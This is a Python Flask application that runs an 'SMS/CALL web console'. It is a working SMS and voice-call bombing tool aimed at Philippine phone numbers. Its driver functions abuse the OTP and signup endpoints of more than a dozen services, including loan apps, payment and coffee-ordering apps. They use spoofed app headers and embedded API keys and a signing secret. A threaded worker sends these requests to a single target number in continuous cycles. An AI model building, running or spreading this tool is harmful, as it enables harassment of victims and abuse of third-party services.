#!/usr/bin/env python3
# app.py — SMS/CALL web console (open · per-session isolation)
# local: pip install -r requirements.txt && python app.py
# prod:  gunicorn app:app --bind 0.0.0.0:$PORT --workers 1 --threads 16 --worker-class gthread --timeout 120

import hashlib
import json
import os
import random
import re
import threading
import time
import uuid
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from functools import wraps

import requests
from flask import Flask, jsonify, make_response, render_template, request

app = Flask(__name__)

# ──────────────────────────────────────────────────────────
# TUNING
# ──────────────────────────────────────────────────────────

MAX_SESSIONS            = 4      # hard cap, free tier RAM
MAX_CONCURRENT_CAMPAIGNS = 3     # active workers at once
SESSION_IDLE_SECONDS    = 600    # 10 min no poll -> reap
START_RATE_PER_IP       = 5      # starts per minute per IP
STATUS_RATE_PER_IP      = 600    # status polls per minute per IP

# ──────────────────────────────────────────────────────────
# SERVICE DRIVERS
# ──────────────────────────────────────────────────────────

def format_phone(phone: str) -> str:
    clean = re.sub(r"\D", "", phone)
    if clean.startswith("63"):
        clean = clean[2:]
    if clean.startswith("0"):
        clean = clean[1:]
    return clean[:10]


def random_string(n: int = 10) -> str:
    return "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(n))


def random_email() -> str:
    return f"{random_string(10)}@gmail.com"


def _now() -> int:
    return int(time.time())


def _now_ms() -> int:
    return int(time.time() * 1000)


def mwell_send(phone):
    try:
        f = format_phone(phone)
        ts = _now_ms()
        h = {
            "User-Agent": "okhttp/4.11.0",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "ocp-apim-subscription-key": "0a57846786b34b0a89328c39f584892b",
            "x-app-version": "03.942.035",
            "x-device-type": "android",
            "x-device-model": "oneplus CPH2465",
            "x-timestamp": str(ts),
            "x-request-id": random_string(16),
        }
        b = {"country": "PH", "phoneNumber": f, "phoneNumberPrefix": "+63"}
        r = requests.post("https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def pexx_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "okhttp/4.12.0",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "appversion": "3.0.14",
            "x-msession-id": "undefined",
            "tid": random_string(11),
        }
        b = {"0": {"json": {"email": "", "areaCode": "+63", "phone": f"+63{f}",
                             "otpChannel": "TG", "otpUsage": "REGISTRATION"}}}
        r = requests.post("https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def supportvip_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "okhttp/4.11.0",
            "Accept-Encoding": "gzip",
            "boat": "com.peso.loan.vip.credit",
            "surface": "1.0.7",
            "suggestion": "d284bf47c4c1e4da4e3e6375498c6245",
            "telescope": "",
            "Content-Type": "application/json; charset=utf-8",
        }
        b = {"invasion": f, "persist": "login", "threshold": False}
        r = requests.post("https://supportviploan.com/pomelo/abortion/suffering/test",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def ezloan_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "okhttp/4.9.2",
            "Accept": "application/json",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "accept-language": "en",
            "imei": random_string(32),
            "device": "android",
            "appversion": "2.0.4",
            "appid": "EZLOAN",
            "businessid": "EZLOAN",
        }
        b = {"businessId": "EZLOAN", "contactNumber": f"+63{f}"}
        r = requests.post("https://gateway.ezloancash.ph/security/auth/otp/request",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def xpressph_send(phone):
    try:
        f = format_phone(phone)
        ts = _now()
        h = {
            "User-Agent": "Dalvik/2.1.0",
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        b = {"FirstName": f"User{ts}", "LastName": "Test",
             "Email": f"user{ts}@gmail.com", "Phone": f"+63{f}"}
        r = requests.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def bistro_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 16; CPH2465 Build/BP2A.250605.031.A2; wv) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "x-requested-with": "com.allcardtech.bistro",
        }
        r = requests.get(
            f"https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{f}",
            headers=h, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def bayadcenter_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
        }
        b = {"mobileNumber": f"+63{f}", "emailAddress": random_email()}
        r = requests.post("https://api.online.bayad.com/api/sign-up/otp",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def supremeloan_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "okhttp/4.11.0",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "bill": "",
            "syndrome": "1.1.3",
            "throughout": "com.supreme.money.loan",
            "cute": "d284bf47c4c1e4da4e3e6375498c6245",
            "cure": "14.864864864864865",
            "come": "121.05883328670785",
            "Content-Type": "application/json; charset=utf-8",
        }
        b = {"aide": "d284bf47c4c1e4da4e3e6375498c6245", "exactly": f, "sick": False}
        r = requests.post("https://suprememoneyloan.com/berry/oak/puzzle/wipe/blade",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def pickupcoffee_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "okhttp/4.12.0",
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        b = {"mobile_number": f"+63{f}", "login_method": "mobile_number"}
        r = requests.post("https://production.api.pickup-coffee.net/v2/customers/login",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def honeyloan_send(phone):
    try:
        f = format_phone(phone)
        h = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15)",
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        b = {"phone": f}
        r = requests.post("https://api.honeyloan.ph/api/client/registration/step-one",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def kumuph_send(phone):
    try:
        f = format_phone(phone)
        ts = _now()
        rnd = random_string(32)
        sig = hashlib.sha256(f"{ts}{rnd}{f}kumu_secret_2024".encode()).hexdigest()
        h = {
            "User-Agent": "okhttp/5.0.0-alpha.14",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "Device-Type": "android",
            "Device-Id": random_string(16),
        }
        b = {
            "country_code": "+63",
            "encrypt_rnd_string": rnd,
            "cellphone": f,
            "encrypt_signature": sig,
            "encrypt_timestamp": ts,
        }
        r = requests.post("https://api.kumuapi.com/v2/user/sendverifysms",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def s5com_send(phone):
    try:
        f = f"+63{format_phone(phone)}"
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36",
        }
        r = requests.post("https://api.s5.com/player/api/v1/otp/request",
                          headers=h, data=f"phone_number={f}", timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def cashalo_send(phone):
    try:
        f = format_phone(phone)
        dev = random_string(16)
        h = {
            "User-Agent": "okhttp/4.12.0",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "x-api-key": "UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==",
            "x-device-identifier": dev,
            "x-device-type": "1",
        }
        b = {"phone_number": f, "device_identifier": dev, "device_type": 1}
        r = requests.post("https://api.cashaloapp.com/access/register",
                          headers=h, json=b, timeout=8)
        return r.status_code == 200
    except Exception:
        return False


def mocasa_voice_send(phone):
    try:
        f = format_phone(phone)
        if not f.startswith("9"):
            return False
        payload = json.dumps({
            "country": "Philippines",
            "appVersion": 206,
            "appPackageName": "com.mocasa.ph",
            "mobile": f,
            "channel": "APP",
            "systemType": 0,
            "myDeviceId": "0536db2db2b341e483de881c94e0e203",
            "appCode": "mocasa",
            "sendChannel": "voice",
            "verifyType": 1,
            "token": "",
        })
        h = {
            "User-Agent": "okhttp/4.8.0",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
        }
        r = requests.post("https://service.mocasa.com/app/v1/login/sendVerifyCode",
                          headers=h, data=payload, timeout=15)
        if r.status_code == 200:
            return r.json().get("code") == 0
        return False
    except Exception:
        return False


SMS_SERVICES = [
    ("MWELL", mwell_send),
    ("PEXX", pexx_send),
    ("SUPPORT VIP", supportvip_send),
    ("EZLOAN", ezloan_send),
    ("XPRESS PH", xpressph_send),
    ("BISTRO", bistro_send),
    ("BAYAD CENTER", bayadcenter_send),
    ("SUPREME LOAN", supremeloan_send),
    ("PICKUP COFFEE", pickupcoffee_send),
    ("HONEY LOAN", honeyloan_send),
    ("KUMU PH", kumuph_send),
    ("S5.COM", s5com_send),
    ("CASHALO", cashalo_send),
]

VOICE_SERVICES = [
    ("MOCASA VOICE", mocasa_voice_send),
]

# ──────────────────────────────────────────────────────────
# SESSION STATE
# ──────────────────────────────────────────────────────────

class Session:
    def __init__(self, sid: str):
        self.sid = sid
        self.lock = threading.Lock()
        self.running = False
        self.phone = ""
        self.continuous = False
        self.interval = 0.0
        self.cycle = 0
        self.sms_ok = 0
        self.sms_total = 0
        self.voice_ok = 0
        self.voice_total = 0
        self.started_at = None
        self.stop_flag = threading.Event()
        self.log = deque(maxlen=400)
        self.last_seen = time.time()
        self.worker = None

    def touch(self):
        self.last_seen = time.time()

    def logline(self, kind: str, msg: str):
        with self.lock:
            self.log.append({"t": datetime.now().strftime("%H:%M:%S"),
                             "kind": kind, "msg": msg})

    def snapshot(self) -> dict:
        with self.lock:
            started = self.started_at
            uptime = (time.time() - started) if started and self.running else 0
            return {
                "running": self.running,
                "phone": self.phone,
                "continuous": self.continuous,
                "interval": self.interval,
                "cycle": self.cycle,
                "sms_ok": self.sms_ok,
                "sms_total": self.sms_total,
                "voice_ok": self.voice_ok,
                "voice_total": self.voice_total,
                "uptime": round(uptime, 1),
                "log": list(self.log)[-120:],
            }


SESSIONS: dict[str, Session] = {}
SESSIONS_LOCK = threading.Lock()

def active_campaigns() -> int:
    with SESSIONS_LOCK:
        return sum(1 for s in SESSIONS.values() if s.running)


def get_or_create_session() -> Session:
    sid = request.cookies.get("sid", "")
    with SESSIONS_LOCK:
        if sid and sid in SESSIONS:
            s = SESSIONS[sid]
            s.touch()
            return s
        if len(SESSIONS) >= MAX_SESSIONS:
            # drop the oldest idle session if possible
            idle = [(s.last_seen, k) for k, s in SESSIONS.items() if not s.running]
            if idle:
                _, dead_sid = min(idle)
                SESSIONS.pop(dead_sid, None)
            else:
                raise RuntimeError("busy")
        sid = uuid.uuid4().hex
        s = Session(sid)
        SESSIONS[sid] = s
        return s


def attach_cookie(resp, sid: str):
    resp.set_cookie("sid", sid, max_age=SESSION_IDLE_SECONDS * 2,
                    httponly=True, samesite="Lax", secure=True)


# ──────────────────────────────────────────────────────────
# RATE LIMIT — per IP
# ──────────────────────────────────────────────────────────

RATE_LOCK = threading.Lock()
RATE: dict[str, defaultdict] = {
    "start": defaultdict(deque),
    "status": defaultdict(deque),
}


def rate_ok(bucket: str, limit: int, window: float = 60.0) -> bool:
    ip = request.headers.get("CF-Connecting-IP") or request.remote_addr or "?"
    now = time.time()
    with RATE_LOCK:
        dq = RATE[bucket][ip]
        while dq and now - dq[0] > window:
            dq.popleft()
        if len(dq) >= limit:
            return False
        dq.append(now)
        return True


# ──────────────────────────────────────────────────────────
# SECURITY HEADERS
# ──────────────────────────────────────────────────────────

@app.after_request
def security_headers(resp):
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["Referrer-Policy"] = "no-referrer"
    resp.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "connect-src 'self'; "
        "frame-ancestors 'none'; "
        "base-uri 'none'; "
        "form-action 'none'"
    )
    return resp


# ──────────────────────────────────────────────────────────
# WORKER — per session
# ──────────────────────────────────────────────────────────

def fire_one(sess: Session, kind: str, name: str, func, phone: str, ident: int) -> bool:
    if sess.stop_flag.is_set():
        return False
    try:
        ok = bool(func(phone))
    except Exception:
        ok = False
    with sess.lock:
        if kind == "sms":
            sess.sms_total += 1
            if ok:
                sess.sms_ok += 1
        else:
            sess.voice_total += 1
            if ok:
                sess.voice_ok += 1
    sess.logline(kind, f"{name} [{ident}] {'OK' if ok else 'FAIL'}")
    return ok


def run_cycle(sess: Session, phone: str, rounds: int, voice_calls: int):
    with ThreadPoolExecutor(max_workers=30) as ex:
        futs = []
        for r in range(1, rounds + 1):
            for name, fn in SMS_SERVICES:
                futs.append(ex.submit(fire_one, sess, "sms", name, fn, phone, r))
        for c in range(1, voice_calls + 1):
            for name, fn in VOICE_SERVICES:
                futs.append(ex.submit(fire_one, sess, "voice", name, fn, phone, c))
        for f in futs:
            try:
                f.result()
            except Exception:
                pass


def worker_loop(sess: Session, phone: str, rounds: int, voice_calls: int,
                continuous: bool, interval: float):
    while True:
        if sess.stop_flag.is_set():
            break
        with sess.lock:
            sess.cycle += 1
            cyc = sess.cycle
        sess.logline("cycle", f"=== cycle {cyc} start ===")
        run_cycle(sess, phone, rounds, voice_calls)
        with sess.lock:
            snap = (sess.sms_ok, sess.sms_total, sess.voice_ok, sess.voice_total)
        sess.logline("cycle",
            f"=== cycle {cyc} end · sms {snap[0]}/{snap[1]} · voice {snap[2]}/{snap[3]} ===")
        if not continuous:
            break
        if interval > 0:
            if sess.stop_flag.wait(interval):
                break
    with sess.lock:
        sess.running = False
    sess.logline("system", "worker stopped")


# ──────────────────────────────────────────────────────────
# GC — reap idle sessions
# ──────────────────────────────────────────────────────────

def gc_loop():
    while True:
        time.sleep(60)
        now = time.time()
        with SESSIONS_LOCK:
            dead = [sid for sid, s in SESSIONS.items()
                    if not s.running and now - s.last_seen > SESSION_IDLE_SECONDS]
            for sid in dead:
                SESSIONS.pop(sid, None)


threading.Thread(target=gc_loop, daemon=True).start()

# ──────────────────────────────────────────────────────────
# ROUTES
# ──────────────────────────────────────────────────────────

@app.route("/")
def index():
    try:
        sess = get_or_create_session()
    except RuntimeError:
        return ("server busy, retry in 30s", 503,
                {"Retry-After": "30", "Content-Type": "text/plain"})
    resp = make_response(render_template("index.html"))
    attach_cookie(resp, sess.sid)
    return resp


@app.route("/api/start", methods=["POST"])
def api_start():
    if not rate_ok("start", START_RATE_PER_IP):
        return jsonify({"ok": False, "err": "rate limited"}), 429
    try:
        sess = get_or_create_session()
    except RuntimeError:
        return jsonify({"ok": False, "err": "server busy"}), 503

    if sess.running:
        return jsonify({"ok": False, "err": "already running"}), 409
    if active_campaigns() >= MAX_CONCURRENT_CAMPAIGNS:
        return jsonify({"ok": False, "err": "too many active campaigns, retry shortly"}), 503

    data = request.get_json(force=True, silent=True)
    if not isinstance(data, dict):
        return jsonify({"ok": False, "err": "body must be a JSON object"}), 400

    f = format_phone(str(data.get("phone", "")).strip())
    if len(f) != 10 or not f.startswith("9"):
        return jsonify({"ok": False, "err": "invalid PH number"}), 400

    try:
        rounds = int(data.get("rounds", 3))
        voice_calls = int(data.get("voice_calls", 3))
        interval = float(data.get("interval", 0))
    except (TypeError, ValueError):
        return jsonify({"ok": False, "err": "bad config"}), 400

    rounds = max(1, min(10, rounds))
    voice_calls = max(0, min(10, voice_calls))
    interval = max(0.0, min(60.0, interval))
    continuous = bool(data.get("continuous", True))

    with sess.lock:
        sess.phone = f
        sess.continuous = continuous
        sess.interval = interval
        sess.cycle = 0
        sess.sms_ok = 0
        sess.sms_total = 0
        sess.voice_ok = 0
        sess.voice_total = 0
        sess.started_at = time.time()
        sess.running = True
        sess.stop_flag.clear()
        sess.log.clear()
    sess.logline("system",
        f"launch phone={f} rounds={rounds} voice={voice_calls} "
        f"continuous={continuous} interval={interval}s")

    t = threading.Thread(target=worker_loop,
                         args=(sess, f, rounds, voice_calls, continuous, interval),
                         daemon=True)
    sess.worker = t
    t.start()
    return jsonify({"ok": True, "phone": f})


@app.route("/api/stop", methods=["POST"])
def api_stop():
    try:
        sess = get_or_create_session()
    except RuntimeError:
        return jsonify({"ok": False, "err": "server busy"}), 503
    sess.stop_flag.set()
    sess.logline("system", "stop requested")
    return jsonify({"ok": True})


@app.route("/api/status")
def api_status():
    if not rate_ok("status", STATUS_RATE_PER_IP):
        return jsonify({"ok": False, "err": "rate limited"}), 429
    try:
        sess = get_or_create_session()
    except RuntimeError:
        return jsonify({"ok": False, "err": "server busy"}), 503
    snap = sess.snapshot()
    snap["ok"] = True
    resp = jsonify(snap)
    attach_cookie(resp, sess.sid)
    return resp


@app.route("/api/ping")
def api_ping():
    return jsonify({"ok": True})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"KLEN web console — http://0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
